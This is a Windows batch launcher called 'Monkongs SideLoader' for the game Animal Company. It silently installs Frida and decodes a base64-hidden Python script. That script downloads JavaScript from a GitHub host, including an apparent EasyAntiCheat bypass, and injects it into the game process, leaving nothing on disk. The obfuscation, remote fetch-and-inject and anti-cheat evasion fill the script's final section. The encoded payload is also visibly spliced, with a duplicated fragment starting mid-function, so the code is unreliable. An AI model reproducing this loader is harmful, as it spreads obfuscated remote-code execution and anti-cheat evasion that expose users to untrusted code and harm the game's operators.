@echo off
cd /d "%~dp0"

color 0F
title Monkongs SideLoader

reg add "HKCU\Console" /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul 2>&1
for /f "delims=" %%E in ('echo prompt $E ^| cmd') do set "ESC=%%E"

echo Setting up paths...
set "PATH=%PATH%;%APPDATA%\Python\Python312\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python313\Scripts"
set "PATH=%PATH%;C:\Users\%USERNAME%\AppData\Local\Python\pythoncore-3.14-64\Scripts"
set "PATH=%PATH%;%LOCALAPPDATA%\Python\pythoncore-3.14-64\Scripts"

echo.
echo %ESC%[91m----------------------------------%ESC%[0m
echo %ESC%[93mInstalling dependencies...%ESC%[0m
pip install frida frida-tools >nul 2>&1
echo %ESC%[92mReady%ESC%[0m
echo %ESC%[91m----------------------------------%ESC%[0m

setlocal enabledelayedexpansion
set "selected=1"

:menu
cls
call :showmenu
goto getkey

:showmenu
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$s = %selected%; " ^
 "$r = [char]27; " ^
 "Write-Host ''; " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[91mM{0}[93mO{0}[92mN{0}[96mK{0}[94mO{0}[95mN{0}[91mG{0}[93mS{0}[0m  {0}[92mS{0}[96mI{0}[94mD{0}[95mE{0}[91mL{0}[93mO{0}[92mA{0}[96mD{0}[94mE{0}[95mR{0}[0m  {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "$opts = @('1. Start M4Quest only','2. Start EAC Defuser only','3. Start Everything','4. PC Mode (EAC Defuse Always On)'); " ^
 "$colors = @('92','96','93','95'); " ^
 "for ($i=0; $i -lt 4; $i++) { " ^
 "  $c = $colors[$i]; " ^
 "  if (($i+1) -eq $s) { " ^
 "    Write-Host ('  {0}[90m#{0}[0m  {0}[97m^>{0}[0m {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } else { " ^
 "    Write-Host ('  {0}[90m#{0}[0m    {0}[{1}m{2}{0}[90m#{0}[0m' -f $r,$c,$opts[$i].PadRight(38)) " ^
 "  } " ^
 "} " ^
 "Write-Host ('  {0}[90m#{0}[0m                                         {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m#{0}[0m  {0}[36mUp/Down Navigate  -  Enter Select    {0}[90m#{0}[0m' -f $r); " ^
 "Write-Host ('  {0}[90m+=========================================+{0}[0m' -f $r); " ^
 "Write-Host ''"

exit /b 0

:getkey
for /f "delims=" %%A in ('powershell -NoProfile -Command "$k = $host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); Write-Output $k.VirtualKeyCode"') do set "key=%%A"
if "!key!"=="38" (
    set /a selected-=1
    if !selected! lss 1 set "selected=4"
    goto menu
)
if "!key!"=="40" (
    set /a selected+=1
    if !selected! gtr 4 set "selected=1"
    goto menu
)
if "!key!"=="13" goto selected_!selected!
goto getkey

:selected_1
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject quest
pause >nul
goto menu

:selected_2
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject eac
pause >nul
goto menu

:selected_3
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject all
pause >nul
goto menu

:selected_4
cls
echo.
echo  %ESC%[93mFetching scripts from server...%ESC%[0m
call :runInject pcmode
pause >nul
goto menu

:runInject
set "PYTEMP=%TEMP%\monkong_%RANDOM%.py"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[IO.File]::WriteAllText('%PYTEMP%', [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IGZyaWRhLCBzeXMsIG9zLCB1cmxsaWIucmVxdWVzdCwgdGltZQoKQkFTRSA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbW9ua29uZ2xpdmUtZGV2L01lbnVTZXJ2ZXJzL21haW4iCgpTQ1JJUFRTID0gewogICAgImJyaWRnZSI6IHsidXJsIjogIi9mcmlkYS1pbDJjcHAtYnJpZGdlLmpzIiwgImFsd2F5cyI6IFRydWV9LAogICAgInN5bWJvbHMiOiB7InVybCI6ICIvc3ltYm9scy5qcyIsICJhbHdheXMiOiBUcnVlfSwKICAgICJtZW51IjogeyJ1cmwiOiAiL01vbmtzTWVudS5qcyIsICJtb2RlcyI6IFsibWVudSIsICJhbGwiXX0sCiAgICAiZWFjIjogeyJ1cmwiOiAiL0J5cGFzc2VkL2VhYy5qcyIsICJtb2RlcyI6IFsiZWFjIiwgImFsbCIsICJwY21vZGUiXX0sCiAgICAic3R1ZmYiOiB7InVybCI6ICIvQnlwYXNzZWQvc3R1ZmYuanMiLCAibW9kZXMiOiBbImVhYyIsICJhbGwiLCAicGNtb2RlIl19LAogICAgInBjbW9kZSI6IHsidXJsIjogIi9wY21vZGUuanMiLCAibW9kZXMiOiBbInBjbW9kZSJdfSwKICAgICJxdWVzdCI6IHsidXJsIjogIi9tNHF1ZXN0LmpzIiwgIm1vZGVzIjogWyJxdWVzdCIsICJhbGwiXX0sCiAgICAicnBjIjogeyJ1cmwiOiAiL2Rpc2NvcmRycGMuanMiLCAibW9kZXMiOiBbImFsbCJdfSwKfQoKZGVmIGZldGNoKHVybCk6CiAgICB0cnk6CiAgICAgICAgciA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLCBoZWFkZXJzPXsiVXNlci1BZ2VudCI6ICJNb25rc01lbnUvMS4wIn0pCiAgICAgICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ociwgdGltZW91dD0xNSkucmVhZCgpLmRlY29kZSgidXRmLTgiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiICBbIV0gRmFpbGVkOiB7ZX0iKQogICAgICAgIHJldHVybiBOb25lCgpkZWYgZmluZF9wcm9jZXNzKCk6CiAgICBkZXZpY2UgPSBmcmlkYS5nZXRfbG9jYWxfZGV2aWNlKCkKICAgIGZvciBwcm9jIGluIGRldmljZS5lbnVtZXJhdGVfcHJvY2Vzc2VzKCk6CiAgICAgICAgaWYgcHJvYy5uYW1lLmxvd2VyKCkgPT0gImFuaW1hbGNvbXBhbnkuZXhlIjoKICAgICAgICAgICAgcmV0dXJuIHByb2MucGlkCiAgICByZXR1cm4gTm9uZQoKbW9kZSA9IHN5cy5hcmd2WzFdIGlmIGxlbihzeXMuYXJndikgPiAxIGVsc2UgIm1lbnUiCnByaW50KGYiXG5bKl0gTW9kZToge21vZGUudXBwZXIoKX0iKQpwcmludCgiWypdIFJlYWRpbmcgd2ViIHN0cmVhbS4uLlxuIikKCnVybHMgPSBbXQpmb3IgbmFtZSwgaW5mbyBpbiBTQ1JJUFRTLml0ZW1zKCk6CiAgICBhbHdheXMgPSBpbmZvLmdldCgiYWx3YXlzIiwgRmFsc2UpCiAgICBtb2RlcyA9IGluZm8uZ2V0KCJtb2RlcyIsIFtdKQogICAgdXJsID0gaW5mby5nZXQoInVybCIsICIiKQogICAgaWYgdXJsIGFuZCAoYWx3YXlzIG9yIG1vZGUgaW4gbW9kZXMgb3IgbW9kZSA9PSAiYWxsIik6CiAgICAgICAgZnVsbCA9IHVybCBpZiB1cmwuc3RhcnRzd2l0aCgiaHR0cCIpIGVsc2UgZiJ7QkFTRX17dXJsfSIKICAgICAgICB1cmxzLmFwcGVuZCh7Im5hbWUiOiBuYW1lLCAidXJsIjogZnVsbH0pCgpsb2FkZWQgPSBbXQpmb3IgcyBpbiB1cmxzOgogICAgcHJpbnQoZiIgIFJlYWRpbmcgd2ViIHJlc3BvbnNlOiB7c1snbmFtZSddfS4uLiIpCiAgICBzcmMgPSBmZXRjaChzWyJ1cmwiXSkKICAgIGlmIHNyYzoKICAgICAgICBsb2FkZWQuYXBwZW5kKChzWyJuYW1lIl0sIHNyYykpCiAgICAgICAgcHJpbnQoZiIgIFsrXSBHb3Qge3NbJ25hbWUnXX0gKHtsZW4oc3JjKX0gYnl0ZXMpIikKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZiIgIFshXSBTa2lwcGVkIHtzWyduYW1lJ119IikKCmlmIG5vdCBsb2FkZWQ6CiAgICBwcmludCgiWyFdIE5vIHNjcmlwdHMgZmV0Y2hlZCIpCiAgICBzeXMuZXhpdCgxKQoKcHJpbnQoZiJcblsqXSBMYXVuY2ggQW5pbWFsIENvbXBhbnkgdGhyb3VnaCBTdGVhbSBub3cuLi4iKQpwcmludCgiWypdIFdhaXRpbmcgZm9yIEFuaW1hbENvbXBhbnkuZXhlLi4uIikKcGlkID0gTm9uZQpmb3IgaSBpbiByYW5nZSgxMjApOgogICAgcGlkID0gZmluZF9wcm9jZXNzKCkKICAgIGlmIHBpZDoKICAgICAgICBicmVhawogICAgdGltZS5zbGVlcCgxKQoKaWYgbm90IHBpZDoKICAgIHByaW50KCJbIV0gVGltZWQgb3V0IHdhaXRpbmcgZm9yIEFuaW1hbENvbXBhbnkuZXhlIikKICAgIHN5cy5leGl0KDEpCgpwcmludChmIlsqXSBGb3VuZCBQSUQge3BpZH0gLSBhdHRhY2hpbmcuLi4iKQp0cnk6CiAgICBkZXZpY2UgPSBmcmlkYS5nZXRfbG9jYWxfZGV2aWNlKCkKICAgIHNlc3Npb24gPSBkZXZpY2UuYXR0YWNoKHBpZCkKICAgIHByaW50KGYiWypdIEF0dGFjaGVkIHRvIFBJRCB7cGlkfSIpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHByaW50KGYiWyFdIEF0dGFjaCBmYWlsZWQ6IHtlfSIpCiAgICBzeXMuZXhpdCgxKQoKbG9hZGVkX3NjcmlwdHMgPSBbXQpmb3IgbmFtZSwgc3JjIGluIGxvYWRlZDoKICAgIHRyeToKICAgICAgICBzID0gc2Vzc2lvbi5jcmVhdGVfc2NyaXB0KHNyYywgbmFtZT1uYW1lLCBydW50aW1lPSJ2OCIpCiAgICAgICAgcy5sb2FkKCkKICAgICAgICBsb2FkZWRfc2NyaXB0cy5hcHBlbmQoKG5hbWUsIHMpKQogICAgICAgIHByaW50KGYiICBbK10gTG9hZGVkIHNjcmlwdDoge25hbWV9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIiAgWyFdIEZhaWxlZCB7bmFtZX06IHtlfSIpCgpwcmludChmIlxuWypdIHtsZW4obG9hZGVkX3NjcmlwdHMpfSBzY3JpcHQocykgbG9hZGVkIGluIEZyaWRhIikKcHJpbnQoIlsqXSBOb3RoaW5nIG9uIGRpc2sgLSBhbGwgdHJhbnNtaXR0ZWQiKQpwcmludCgiWypdIFByZXNzIEN0cmwrQyB0byBkZXRhY2hcbiIpCnRyeToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGltZS5zbGVlcCgxKQpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICBwcmludCgiXG5bKl0gVW5sb2FkaW5nIHNjcmlwdHMuLi4iKQogICAgZm9yIG5hbWUsIHMgaW4gbG9hZGVkX3NjcmlwdHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzLnVubG9hZCgpCiAgICAgICAgICAgIHByaW50KGYiICBbLV0gVW5sb2FkZWQge25hbWV9IikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIHByaW50KCJbKl0gRGV0YWNoaW5nLi4uIikKICAgIHNlc3Npb24uZGV0YWNoKCkKICAgIHByaW50KCJbKl0gRG9uZSIpgICAgICBpZiBza2lwX2Jsb2NrID4gMDoKICAgICAgICAgICAgc2tpcF9ibG9jayArPSBzdHJpcHBlZC5jb3VudCgieyIpIC0gc3RyaXBwZWQuY291bnQoIn0iKQogICAgICAgICAgICBpZiBza2lwX2Jsb2NrIDw9IDA6CiAgICAgICAgICAgICAgICBza2lwX2Jsb2NrID0gMAogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIHJlLm1hdGNoKHIiXlxzKihkZWNsYXJlfGV4cG9ydClccysiLCBzdHJpcHBlZCk6CiAgICAgICAgICAgIGlmICJ7IiBpbiBzdHJpcHBlZCBhbmQgIn0iIG5vdCBpbiBzdHJpcHBlZDoKICAgICAgICAgICAgICAgIHNraXBfYmxvY2sgPSAxCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgaWYgcmUubWF0Y2gociJeXHMqaW50ZXJmYWNlXHMrIiwgc3RyaXBwZWQpOgogICAgICAgICAgICBpZiAieyIgaW4gc3RyaXBwZWQ6CiAgICAgICAgICAgICAgICBza2lwX2Jsb2NrID0gMQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIHJlLm1hdGNoKHIiXlxzKnR5cGVccytcdytccyo9Iiwgc3RyaXBwZWQpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIHJlLm1hdGNoKHIiXlxzKmVudW1ccytcdysiLCBzdHJpcHBlZCk6CiAgICAgICAgICAgIGlmICJ7IiBpbiBzdHJpcHBlZDoKICAgICAgICAgICAgICAgIHNraXBfYmxvY2sgPSAxCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgcyA9IGxpbmUKICAgICAgICBzID0gcmUuc3ViKHIiOlxzKihzdHJpbmd8bnVtYmVyfGJvb2xlYW58dm9pZHxhbnl8bnVsbHx1bmRlZmluZWR8bmV2ZXJ8dW5rbm93bnxvYmplY3R8QXJyYXl8UHJvbWlzZXxNYXB8U2V0KVxiIiwgIiIsIHMpCiAgICAgICAgcyA9IHJlLnN1YihyIjpccypbQS1aXVx3KihcW1xdKT8iLCAiIiwgcykKICAgICAgICBzID0gcmUuc3ViKHIiPFx3KyhccyosXHMqXHcrKSo+IiwgIiIsIHMpCiAgICAgICAgcyA9IHJlLnN1YihyIlxiYXNccytcdysiLCAiIiwgcykKICAgICAgICBzID0gcmUuc3ViKHIiXD9cczo6IiwgIjoiLCBzKQogICAgICAgIHMgPSByZS5zdWIociJcKFwpXHMqOlxzKlx3KyIsICIoKSIsIHMpCiAgICAgICAgcyA9IHJlLnN1YihyIixccypcKSIsICIpIiwgcykKICAgICAgICBzID0gcmUuc3ViKHIiaW1wb3J0XHMqXHtbXn1dKlx9XHMqZnJvbVxzKlsnXCJdW14nXCJdKlsnXCJdXHMqOz8iLCAiLy8gaW1wb3J0IHJlbW92ZWQiLCBzKQogICAgICAgIHMgPSByZS5zdWIociJpbXBvcnRccytcdytccypmcm9tXHMqWydcIl1bXidcIl0qWydcIl1cczo7PyIsICIvLyBpbXBvcnQgcmVtb3ZlZCIsIHMpCiAgICAgICAgcyA9IHJlLnN1YihyImV4cG9ydFxzKyhkZWZhdWx0XHMrKT8iLCAiIiwgcykKICAgICAgICBpZiBzLnN0cmlwKCk6CiAgICAgICAgICAgIG91dC5hcHBlbmQocykKICAgIHJldHVybiAiXG4iLmpvaW4ob3V0KQoKZGVmIGZpbmRfcHJvY2VzcygpOgogICAgZGV2aWNlID0gZnJpZGEuZ2V0X2xvY2FsX2RldmljZSgpCiAgICBmb3IgcHJvYyBpbiBkZXZpY2UuZW51bWVyYXRlX3Byb2Nlc3NlcygpOgogICAgICAgIGlmIHByb2MubmFtZS5sb3dlcigpID09ICJhbmltYWxjb21wYW55LmV4ZSI6CiAgICAgICAgICAgIHJldHVybiBwcm9jLnBpZAogICAgcmV0dXJuIE5vbmUKCm1vZGUgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJtZW51IgpwcmludChmIlxuWypdIE1vZGU6IHttb2RlLnVwcGVyKCl9IikKcHJpbnQoIlsqXSBSZWFkaW5nIHdlYiBzdHJlYW0uLi5cbiIpCgp1cmxzID0gW10KZm9yIG5hbWUsIGluZm8gaW4gU0NSSVBUUy5pdGVtcygpOgogICAgYWx3YXlzID0gaW5mby5nZXQoImFsd2F5cyIsIEZhbHNlKQogICAgbW9kZXMgPSBpbmZvLmdldCgibW9kZXMiLCBbXSkKICAgIHVybCA9IGluZm8uZ2V0KCJ1cmwiLCAiIikKICAgIGlmIHVybCBhbmQgKGFsd2F5cyBvciBtb2RlIGluIG1vZGVzIG9yIG1vZGUgPT0gImFsbCIpOgogICAgICAgIGZ1bGwgPSB1cmwgaWYgdXJsLnN0YXJ0c3dpdGgoImh0dHAiKSBlbHNlIGYie0JBU0V9e3VybH0iCiAgICAgICAgdXJscy5hcHBlbmQoeyJuYW1lIjogbmFtZSwgInVybCI6IGZ1bGx9KQoKbG9hZGVkID0gW10KZm9yIHMgaW4gdXJsczoKICAgIHByaW50KGYiICBSZWFkaW5nIHdlYiByZXNwb25zZToge3NbJ25hbWUnXX0uLi4iKQogICAgc3JjID0gZmV0Y2goc1sidXJsIl0pCiAgICBpZiBzcmM6CiAgICAgICAgbG9hZGVkLmFwcGVuZCgoc1sibmFtZSJdLCBzcmMpKQogICAgICAgIHByaW50KGYiICBbK10gR290IHtzWyduYW1lJ119ICh7bGVuKHNyYyl9IGJ5dGVzKSIpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICBbIV0gU2tpcHBlZCB7c1snbmFtZSddfSIpCgppZiBub3QgbG9hZGVkOgogICAgcHJpbnQoIlshXSBObyBzY3JpcHRzIGZldGNoZWQiKQogICAgc3lzLmV4aXQoMSkKCnByaW50KGYiXG5bKl0gQ29tcGlsaW5nIFR5cGVTY3JpcHQuLi4iKQpjb21waWxlZCA9IFtdCmZvciBuYW1lLCBzcmMgaW4gbG9hZGVkOgogICAgaWYgbmFtZS5lbmRzd2l0aCgiLnRzIik6CiAgICAgICAganMgPSBzdHJpcF90cyhzcmMpCiAgICAgICAgaWYganMgYW5kIGxlbihqcy5zdHJpcCgpKSA+IDEwOgogICAgICAgICAgICBjb21waWxlZC5hcHBlbmQoKG5hbWUsIGpzKSkKICAgICAgICAgICAgcHJpbnQoZiIgIFsrXSBDb21waWxlZCB7bmFtZX0gKHtsZW4oanMpfSBjaGFycykiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiICBbIV0gRmFpbGVkIHRvIGNvbXBpbGUge25hbWV9LCBza2lwcGluZyIpCiAgICBlbHNlOgogICAgICAgIGNvbXBpbGVkLmFwcGVuZCgobmFtZSwgc3JjKSkKICAgICAgICBwcmludChmIiAgWytdIEpTIHJlYWR5IHtuYW1lfSIpCgpwcmludChmIlxuWypdIExhdW5jaCBBbmltYWwgQ29tcGFueSB0aHJvdWdoIFN0ZWFtIG5vdy4uLiIpCnByaW50KCJbKl0gV2FpdGluZyBmb3IgQW5pbWFsQ29tcGFueS5leGUuLi4iKQpwaWQgPSBOb25lCmZvciBpIGluIHJhbmdlKDEyMCk6CiAgICBwaWQgPSBmaW5kX3Byb2Nlc3MoKQogICAgaWYgcGlkOgogICAgICAgIGJyZWFrCiAgICB0aW1lLnNsZWVwKDEpCgppZiBub3QgcGlkOgogICAgcHJpbnQoIlshXSBUaW1lZCBvdXQgd2FpdGluZyBmb3IgQW5pbWFsQ29tcGFueS5leGUiKQogICAgc3lzLmV4aXQoMSkKCnByaW50KGYiWypdIEZvdW5kIFBJRCB7cGlkfSAtIGF0dGFjaGluZy4uLiIpCnRyeToKICAgIGRldmljZSA9IGZyaWRhLmdldF9sb2NhbF9kZXZpY2UoKQogICAgc2Vzc2lvbiA9IGRldmljZS5hdHRhY2gocGlkKQogICAgcHJpbnQoZiJbKl0gQXR0YWNoZWQgdG8gUElEIHtwaWR9IikKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoZiJbIV0gQXR0YWNoIGZhaWxlZDoge2V9IikKICAgIHN5cy5leGl0KDEpCgpsb2FkZWRfc2NyaXB0cyA9IFtdCmZvciBuYW1lLCBzcmMgaW4gY29tcGlsZWQ6CiAgICB0cnk6CiAgICAgICAgcyA9IHNlc3Npb24uY3JlYXRlX3NjcmlwdChzcmMsIG5hbWU9bmFtZSwgcnVudGltZT0idjgiKQogICAgICAgIHMubG9hZCgpCiAgICAgICAgbG9hZGVkX3NjcmlwdHMuYXBwZW5kKChuYW1lLCBzKSkKICAgICAgICBwcmludChmIiAgWytdIExvYWRlZCBzY3JpcHQ6IHtuYW1lfSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgIFshXSBGYWlsZWQge25hbWV9OiB7ZX0iKQoKcHJpbnQoZiJcblsqXSB7bGVuKGxvYWRlZF9zY3JpcHRzKX0gc2NyaXB0KHMpIGxvYWRlZCBpbiBGcmlkYSIpCnByaW50KCJbKl0gTm90aGluZyBvbiBkaXNrIC0gYWxsIHRyYW5zbWl0dGVkIikKcHJpbnQoIlsqXSBQcmVzcyBDdHJsK0MgdG8gZGV0YWNoXG4iKQp0cnk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRpbWUuc2xlZXAoMSkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgcHJpbnQoIlxuWypdIFVubG9hZGluZyBzY3JpcHRzLi4uIikKICAgIGZvciBuYW1lLCBzIGluIGxvYWRlZF9zY3JpcHRzOgogICAgICAgIHRyeToKICAgICAgICAgICAgcy51bmxvYWQoKQogICAgICAgICAgICBwcmludChmIiAgWy1dIFVubG9hZGVkIHtuYW1lfSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICBwcmludCgiWypdIERldGFjaGluZy4uLiIpCiAgICBzZXNzaW9uLmRldGFjaCgpCiAgICBwcmludCgiWypdIERvbmUiKQ==')))"
python "%PYTEMP%" %1
del /f /q "%PYTEMP%" >nul 2>&1
